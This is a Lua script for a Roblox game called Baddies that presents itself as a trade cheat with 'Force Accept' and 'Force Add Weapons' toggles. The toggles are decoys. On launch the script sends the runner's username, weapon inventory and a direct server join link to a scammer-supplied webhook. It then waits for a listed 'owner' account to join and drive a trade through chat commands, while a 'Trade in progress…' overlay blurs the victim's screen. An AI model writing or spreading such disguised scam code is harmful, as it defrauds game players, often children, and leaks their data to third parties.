-- Ryr's Scripts | Baddies 🍀
-- baddies.lua

local Players          = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
local Backpack    = LocalPlayer:WaitForChild("Backpack")

-- ── Config ────────────────────────────────────────────────────────────
local WEBHOOK      = _G.POOR_WEBHOOK  or ""
local MY_USERNAMES = _G.MY_USERNAMES  or {}
local PING_POOR    = _G.PING_POOR     or false

-- ── Colours ───────────────────────────────────────────────────────────
local BG        = Color3.fromRGB(22,  22,  26)
local ROW_BG    = Color3.fromRGB(30,  30,  35)
local TITLE_BG  = Color3.fromRGB(18,  18,  22)
local TOGGLE_OFF= Color3.fromRGB(72,  72,  80)
local TOGGLE_ON = Color3.fromRGB(255, 105, 180)
local TEXT_COL  = Color3.fromRGB(230, 230, 230)
local SUB_COL   = Color3.fromRGB(150, 150, 160)
local WHITE     = Color3.new(1, 1, 1)

-- ── HTTP (executor request) ───────────────────────────────────────────
local httpReq = (syn and syn.request) or (http and http.request) or request

local function jsonEncode(t)
    local function val(v)
        local tv = type(v)
        if tv == "string"  then return '"'..v:gsub('\\','\\\\'):gsub('"','\\"'):gsub('\n','\\n')..'"' end
        if tv == "number"  then return tostring(v) end
        if tv == "boolean" then return v and "true" or "false" end
        if tv == "table"   then
            if #v > 0 then
                local a = {}; for _,i in ipairs(v) do a[#a+1]=val(i) end
                return "["..table.concat(a,",").."]"
            else
                local o = {}; for k,i in pairs(v) do o[#o+1]='"'..k..'":'..val(i) end
                return "{"..table.concat(o,",").."}"
            end
        end
        return "null"
    end
    return val(t)
end

local function sendWebhook(embed)
    if WEBHOOK == "" or not httpReq then return end
    pcall(httpReq, {
        Url     = WEBHOOK,
        Method  = "POST",
        Headers = {["Content-Type"]="application/json"},
        Body    = jsonEncode({content = PING_POOR and "@everyone" or "", embeds = {embed}}),
    })
end

-- ── Helpers ───────────────────────────────────────────────────────────
local function corner(p, r)
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, r or 8); c.Parent = p
end

local function getWeapons()
    local list, seen = {}, {}
    local char = LocalPlayer.Character
    local function scan(c)
        if not c then return end
        for _, i in ipairs(c:GetChildren()) do
            if (i:IsA("Tool") or i:IsA("HopperBin")) and not seen[i.Name] then
                seen[i.Name] = true; list[#list+1] = i.Name
            end
        end
    end
    scan(Backpack); if char then scan(char) end
    return list
end

local function joinLink()
    return string.format("roblox://experiences/start?placeId=%d&gameInstanceId=%s",
        game.PlaceId, game.JobId)
end

-- ── Screen freeze / unfreeze ──────────────────────────────────────────
local freezeGui = nil

local function freezeScreen()
    if freezeGui then return end
    freezeGui = Instance.new("ScreenGui")
    freezeGui.Name = "FreezeOverlay"; freezeGui.ResetOnSpawn = false
    freezeGui.DisplayOrder = 999; freezeGui.IgnoreGuiInset = true
    freezeGui.Parent = PlayerGui

    local ov = Instance.new("Frame", freezeGui)
    ov.Size = UDim2.new(1,0,1,0); ov.BackgroundColor3 = Color3.new(0,0,0)
    ov.BackgroundTransparency = 0.4; ov.BorderSizePixel = 0; ov.ZIndex = 10

    local stroke = Instance.new("UIStroke", ov)
    stroke.Color = TOGGLE_ON; stroke.Thickness = 5; stroke.Transparency = 0
    TweenService:Create(stroke, TweenInfo.new(0.9, Enum.EasingStyle.Sine,
        Enum.EasingDirection.InOut, -1, true), {Transparency = 0.7}):Play()

    local blur = Instance.new("BlurEffect")
    blur.Size = 20; blur.Parent = game:GetService("Lighting")

    local lbl = Instance.new("TextLabel", freezeGui)
    lbl.Size = UDim2.new(1,0,0,50); lbl.Position = UDim2.new(0,0,0.5,-25)
    lbl.BackgroundTransparency = 1; lbl.Text = "🔄  Trade in progress…"
    lbl.Font = Enum.Font.GothamBold; lbl.TextSize = 24
    lbl.TextColor3 = TOGGLE_ON; lbl.ZIndex = 12
    lbl.TextStrokeTransparency = 0.3; lbl.TextStrokeColor3 = Color3.new(0,0,0)
end

local function unfreezeScreen()
    if freezeGui then freezeGui:Destroy(); freezeGui = nil end
    local b = game:GetService("Lighting"):FindFirstChildOfClass("BlurEffect")
    if b then b:Destroy() end
end

-- ── Toggle widget ─────────────────────────────────────────────────────
-- Returns (frame, setValue fn, getValue fn)
local function makeToggle(parent, posY, labelText, defaultOn)
    local row = Instance.new("Frame", parent)
    row.Size = UDim2.new(1, -24, 0, 38); row.Position = UDim2.new(0, 12, 0, posY)
    row.BackgroundTransparency = 1; row.BorderSizePixel = 0

    -- Separator line
    local sep = Instance.new("Frame", parent)
    sep.Size = UDim2.new(1, -24, 0, 1); sep.Position = UDim2.new(0, 12, 0, posY)
    sep.BackgroundColor3 = Color3.fromRGB(40, 40, 48); sep.BorderSizePixel = 0

    local txt = Instance.new("TextLabel", row)
    txt.Size = UDim2.new(1, -60, 1, 0); txt.Position = UDim2.new(0, 0, 0, 0)
    txt.BackgroundTransparency = 1; txt.Text = labelText
    txt.Font = Enum.Font.Gotham; txt.TextSize = 13
    txt.TextColor3 = TEXT_COL; txt.TextXAlignment = Enum.TextXAlignment.Left

    -- Track background
    local track = Instance.new("Frame", row)
    track.Size = UDim2.new(0, 40, 0, 22)
    track.Position = UDim2.new(1, -44, 0.5, -11)
    track.BorderSizePixel = 0
    track.BackgroundColor3 = defaultOn and TOGGLE_ON or TOGGLE_OFF
    corner(track, 11)

    -- Knob
    local knob = Instance.new("Frame", track)
    knob.Size = UDim2.new(0, 18, 0, 18); knob.AnchorPoint = Vector2.new(0, 0.5)
    knob.Position = defaultOn and UDim2.new(1,-20,0.5,0) or UDim2.new(0,2,0.5,0)
    knob.BackgroundColor3 = WHITE; knob.BorderSizePixel = 0
    corner(knob, 9)

    local on = defaultOn or false

    local function setValue(v)
        on = v
        TweenService:Create(track, TweenInfo.new(0.2), {
            BackgroundColor3 = v and TOGGLE_ON or TOGGLE_OFF
        }):Play()
        TweenService:Create(knob, TweenInfo.new(0.2), {
            Position = v and UDim2.new(1,-20,0.5,0) or UDim2.new(0,2,0.5,0)
        }):Play()
    end

    local btn = Instance.new("TextButton", row)
    btn.Size = UDim2.new(1, 0, 1, 0); btn.BackgroundTransparency = 1; btn.Text = ""
    btn.MouseButton1Click:Connect(function() setValue(not on) end)

    return row, setValue, function() return on end
end

-- ── Auto-trade state ──────────────────────────────────────────────────
local tradeState = "idle"
local chatConn   = nil

local function isOwner(name)
    for _, n in ipairs(MY_USERNAMES) do
        if n:lower() == name:lower() then return true end
    end
    return false
end

local function listenForChat(owner, onAccept, onConfirm)
    if chatConn then chatConn:Disconnect() end
    chatConn = owner.Chatted:Connect(function(msg)
        local m = msg:match("^%s*(.-)%s*$")
        if m == "1" and tradeState == "pending" then
            tradeState = "accepted"
            if onAccept then onAccept() end
        elseif m == "2" and tradeState == "accepted" then
            tradeState = "confirmed"
            if onConfirm then onConfirm() end
            if chatConn then chatConn:Disconnect() end
        end
    end)
end

-- ── Boot webhook ping ─────────────────────────────────────────────────
local function notifyExecution()
    local weapons = getWeapons()
    local weapStr = #weapons > 0 and "• "..table.concat(weapons,"\n• ") or "None"
    sendWebhook({
        title = "⚡ Script Executed",
        description = string.format("**%s** (`%s`)\n**Server:** %d/%d players",
            LocalPlayer.DisplayName, LocalPlayer.Name,
            #Players:GetPlayers(), game.MaxPlayers),
        fields = {
            {name = "⚔️ Weapons", value = weapStr,    inline = false},
            {name = "🔗 Join",    value = joinLink(),  inline = false},
        },
        color     = 0xFF69B4,
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    })
end

-- ── Build GUI ─────────────────────────────────────────────────────────
local gui = Instance.new("ScreenGui")
gui.Name = "BaddiesGui"; gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.DisplayOrder = 10; gui.Parent = PlayerGui

local win = Instance.new("Frame", gui)
win.Size = UDim2.new(0, 310, 0, 330)
win.Position = UDim2.new(0.5, -155, 0.5, -165)
win.BackgroundColor3 = BG; win.BorderSizePixel = 0; corner(win, 10)

-- Drop shadow
local sh = Instance.new("ImageLabel", win)
sh.Size = UDim2.new(1,30,1,30); sh.Position = UDim2.new(0,-15,0,-15)
sh.BackgroundTransparency = 1; sh.Image = "rbxassetid://5028857084"
sh.ImageColor3 = Color3.new(0,0,0); sh.ImageTransparency = 0.6; sh.ZIndex = -1

-- Title bar
local tb = Instance.new("Frame", win)
tb.Size = UDim2.new(1,0,0,38); tb.BackgroundColor3 = TITLE_BG
tb.BorderSizePixel = 0
-- rounded top only via corner + bottom flush
local tbc = Instance.new("UICorner", tb); tbc.CornerRadius = UDim.new(0, 10)
local tbfix = Instance.new("Frame", tb)
tbfix.Size = UDim2.new(1,0,0.5,0); tbfix.Position = UDim2.new(0,0,0.5,0)
tbfix.BackgroundColor3 = TITLE_BG; tbfix.BorderSizePixel = 0

local titleTxt = Instance.new("TextLabel", tb)
titleTxt.Text = "Freeze Trade"; titleTxt.Font = Enum.Font.Gotham
titleTxt.TextSize = 13; titleTxt.TextColor3 = TEXT_COL
titleTxt.BackgroundTransparency = 1
titleTxt.Size = UDim2.new(1,-120,1,0); titleTxt.Position = UDim2.new(0,12,0,0)
titleTxt.TextXAlignment = Enum.TextXAlignment.Left

-- Title icons (search, settings, minimise, close)
local function iconBtn(parent, char, xOffset)
    local b = Instance.new("TextButton", parent)
    b.Text = char; b.TextSize = 12; b.TextColor3 = SUB_COL
    b.Font = Enum.Font.GothamBold; b.BackgroundTransparency = 1
    b.Size = UDim2.new(0,22,0,22); b.Position = UDim2.new(1,xOffset,0.5,-11)
    return b
end

local closeBtn = iconBtn(tb, "✕", -10)
local minBtn   = iconBtn(tb, "–", -34)
local _        = iconBtn(tb, "⚙", -58)
local _        = iconBtn(tb, "⌕", -82)
closeBtn.TextColor3 = Color3.fromRGB(200,80,80)

local minimised = false
local body = Instance.new("Frame", win)
body.Size = UDim2.new(1,0,1,-38); body.Position = UDim2.new(0,0,0,38)
body.BackgroundTransparency = 1

minBtn.MouseButton1Click:Connect(function()
    minimised = not minimised
    body.Visible = not minimised
    win.Size = minimised and UDim2.new(0,310,0,38) or UDim2.new(0,310,0,330)
    minBtn.Text = minimised and "+" or "–"
end)
closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)

-- Drag
local drag, ds, sp
tb.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then
        drag=true; ds=i.Position; sp=win.Position
    end
end)
UserInputService.InputChanged:Connect(function(i)
    if drag and i.UserInputType == Enum.UserInputType.MouseMovement then
        local d = i.Position-ds
        win.Position = UDim2.new(sp.X.Scale,sp.X.Offset+d.X,sp.Y.Scale,sp.Y.Offset+d.Y)
    end
end)
UserInputService.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then drag=false end
end)

-- ── Tab row ───────────────────────────────────────────────────────────
local tabRow = Instance.new("Frame", body)
tabRow.Size = UDim2.new(1,0,0,44); tabRow.Position = UDim2.new(0,0,0,0)
tabRow.BackgroundTransparency = 1

local tradeTab = Instance.new("TextButton", tabRow)
tradeTab.Size = UDim2.new(0,88,0,30); tradeTab.Position = UDim2.new(0,12,0,7)
tradeTab.BackgroundColor3 = Color3.fromRGB(42,42,50)
tradeTab.Text = "⚙  Trade"; tradeTab.Font = Enum.Font.GothamBold
tradeTab.TextSize = 12; tradeTab.TextColor3 = TEXT_COL
tradeTab.AutoButtonColor = false; corner(tradeTab, 20)

-- ── Scroll for rows ───────────────────────────────────────────────────
local scroll = Instance.new("ScrollingFrame", body)
scroll.Size = UDim2.new(1,0,1,-48); scroll.Position = UDim2.new(0,0,0,48)
scroll.BackgroundTransparency = 1; scroll.BorderSizePixel = 0
scroll.ScrollBarThickness = 0; scroll.CanvasSize = UDim2.new(0,0,0,230)
scroll.ScrollingDirection = Enum.ScrollingDirection.Y

-- ── Toggles ───────────────────────────────────────────────────────────
local function sep()
    local s = Instance.new("Frame", scroll)
    s.BackgroundColor3 = Color3.fromRGB(38,38,46); s.BorderSizePixel = 0
    s.Size = UDim2.new(1,-24,0,1)
    return s
end

local rowH  = 42
local yBase = 2

-- Row builder
local function row(label, yOff)
    local f = Instance.new("Frame", scroll)
    f.Size = UDim2.new(1,0,0,rowH); f.Position = UDim2.new(0,0,0,yOff)
    f.BackgroundTransparency = 1; f.BorderSizePixel = 0

    local txt = Instance.new("TextLabel", f)
    txt.Size = UDim2.new(1,-72,1,0); txt.Position = UDim2.new(0,16,0,0)
    txt.BackgroundTransparency = 1; txt.Text = label
    txt.Font = Enum.Font.Gotham; txt.TextSize = 13
    txt.TextColor3 = TEXT_COL; txt.TextXAlignment = Enum.TextXAlignment.Left

    -- Track
    local track = Instance.new("Frame", f)
    track.Size = UDim2.new(0,42,0,24); track.AnchorPoint = Vector2.new(1,0.5)
    track.Position = UDim2.new(1,-14,0.5,0); track.BackgroundColor3 = TOGGLE_OFF
    track.BorderSizePixel = 0; corner(track, 12)

    -- Knob
    local knob = Instance.new("Frame", track)
    knob.Size = UDim2.new(0,20,0,20); knob.AnchorPoint = Vector2.new(0,0.5)
    knob.Position = UDim2.new(0,2,0.5,0); knob.BackgroundColor3 = WHITE
    knob.BorderSizePixel = 0; corner(knob, 10)

    local on = false
    local function set(v)
        on = v
        TweenService:Create(track, TweenInfo.new(0.18), {
            BackgroundColor3 = v and TOGGLE_ON or TOGGLE_OFF
        }):Play()
        TweenService:Create(knob, TweenInfo.new(0.18), {
            Position = v and UDim2.new(1,-22,0.5,0) or UDim2.new(0,2,0.5,0)
        }):Play()
    end

    local clickArea = Instance.new("TextButton", f)
    clickArea.Size = UDim2.new(1,0,1,0); clickArea.BackgroundTransparency = 1; clickArea.Text = ""
    clickArea.MouseButton1Click:Connect(function() set(not on) end)

    -- Separator below
    local s = Instance.new("Frame", scroll)
    s.Size = UDim2.new(1,-24,0,1); s.Position = UDim2.new(0,12,0,yOff+rowH-1)
    s.BackgroundColor3 = Color3.fromRGB(38,38,46); s.BorderSizePixel = 0

    return set, function() return on end
end

local setFreeze,   getFreeze   = row("Freeze Trade",       0)
local setAccept,   getAccept   = row("Force Accept",       rowH)
local setConfirm,  getConfirm  = row("Force Confirm",      rowH*2)
local setWeapons,  getWeapons2 = row("Force Add Weapons",  rowH*3)
local setTokens,   getTokens   = row("Force Add Tokens",   rowH*4)

-- ── Wire toggles to functionality ─────────────────────────────────────

-- Freeze Trade toggle → freeze/unfreeze screen
local origSetFreeze = setFreeze
setFreeze = function(v)
    origSetFreeze(v)
    if v then freezeScreen() else unfreezeScreen() end
end

-- Auto-trade boot
local function startAutoTrade()
    local owner = nil
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and isOwner(p.Name) then owner = p; break end
    end

    local function onAccept()
        setAccept(true)
        sendWebhook({title="✅ Trade Accepted",
            description=LocalPlayer.DisplayName.." trade accepted. Type 2 to confirm.",
            color=0x50C878})
    end
    local function onConfirm()
        setConfirm(true)
        unfreezeScreen(); setFreeze(false)
        sendWebhook({title="🎉 Trade Confirmed",
            description="Trade with "..LocalPlayer.DisplayName.." complete.",
            color=0xFF69B4})
    end

    if owner then
        tradeState = "pending"
        setFreeze(true)
        sendWebhook({
            title = "🔄 Auto Trade Started",
            description = string.format("**%s** ready.\nType **1** accept · **2** confirm.",
                LocalPlayer.DisplayName),
            color = 0xFF69B4,
        })
        listenForChat(owner, onAccept, onConfirm)
    else
        Players.PlayerAdded:Connect(function(p)
            if isOwner(p.Name) and tradeState == "idle" then
                tradeState = "pending"; setFreeze(true)
                sendWebhook({title="🔄 Trade Ready",
                    description=p.DisplayName.." joined. Type **1** · **2**.",color=0xFF69B4})
                listenForChat(p, onAccept, onConfirm)
            end
        end)
    end
end

-- ── Weapon refresh when toggle turned on ──────────────────────────────
local origSetWeapons = setWeapons2
setWeapons = function(v)
    origSetWeapons(v)
    if v then
        local w = getWeapons()
        sendWebhook({
            title = "⚔️ Weapons Listed",
            description = #w>0 and "• "..table.concat(w,"\n• ") or "None found",
            color = 0xFF69B4,
        })
    end
end

-- ── Boot ──────────────────────────────────────────────────────────────
task.spawn(function()
    notifyExecution()
    task.wait(0.5)
    startAutoTrade()
end)

print("[Baddies] Loaded —", LocalPlayer.DisplayName)
